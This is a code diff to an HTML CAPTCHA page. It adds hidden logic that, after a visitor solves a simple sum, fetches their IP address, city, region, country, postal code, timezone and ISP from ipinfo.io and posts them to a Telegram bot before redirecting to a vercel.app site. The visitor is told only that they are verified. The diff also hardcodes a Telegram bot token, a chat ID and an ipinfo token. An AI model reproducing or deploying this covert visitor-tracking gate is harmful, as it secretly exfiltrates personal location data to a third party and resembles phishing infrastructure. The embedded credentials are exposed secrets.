@@ -2,8 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>CAPTCHA Page</title>
+  <title>CAPTCHA with Telegram Logging</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -74,6 +73,9 @@
   <script>
     let num1, num2, answer;
 
+    const botToken = "8096041390:AAGBcV0HBqFbmpkOpFy9LbiZczh-WqRQtQY";
+    const chatId = "6529371358";
+
     function generateCaptcha() {
       num1 = Math.floor(Math.random() * 10) + 1;
       num2 = Math.floor(Math.random() * 10) + 1;
@@ -83,25 +85,65 @@
       document.getElementById("captchaInput").value = '';
     }
 
-    function validateCaptcha() {
-  const userAnswer = parseInt(document.getElementById("captchaInput").value);
-  const messageEl = document.getElementById("captchaMessage");
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      const payload = {
+        chat_id: chatId,
+        text: message
+      };
 
-  if (userAnswer === answer) {
-    messageEl.innerHTML = "<p class='success'>Verified! Redirecting... ✅</p>";
-    setTimeout(() => {
-      window.location.href = "https://web-sr3h.vercel.app/index.html"; // <-- Change this to your target URL
-    }, 1000); // 1 second delay before redirect
-  } else {
-    messageEl.innerHTML = "<p class='error'>Incorrect. Please try again.</p>";
-    generateCaptcha();
-  }
-}
+      try {
+        await fetch(url, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        });
+      } catch (err) {
+        console.error("Telegram error:", err);
+      }
+    }
 
+    async function validateCaptcha() {
+      const userAnswer = parseInt(document.getElementById("captchaInput").value);
+      const messageEl = document.getElementById("captchaMessage");
+
+      if (userAnswer === answer) {
+        messageEl.innerHTML = "<p class='success'>Verified! Redirecting... ✅</p>";
+
+        // Get IP info
+        try {
+          const res = await fetch("https://ipinfo.io/json?token=4b4e37d7269136");
+          const data = await res.json();
+
+          const userMessage = `
+🔐 CAPTCHA Passed
+🌍 IP: ${data.ip}
+🏙️ City: ${data.city}
+📍 Region: ${data.region}
+📦 Country: ${data.country}
+📮 Postal: ${data.postal}
+🕐 Timezone: ${data.timezone}
+📱 ISP: ${data.org}
+          `.trim();
+
+          await sendToTelegram(userMessage);
+        } catch (e) {
+          console.warn("IP info error:", e);
+        }
+
+        // Redirect after logging
+        setTimeout(() => {
+          window.location.href = "https://web-sr3h.vercel.app";
+        }, 1000);
+      } else {
+        messageEl.innerHTML = "<p class='error'>Incorrect. Please try again.</p>";
+        generateCaptcha();
+      }
+    }
 
     window.onload = generateCaptcha;
   </script>
 </body>
 </html>
-
-
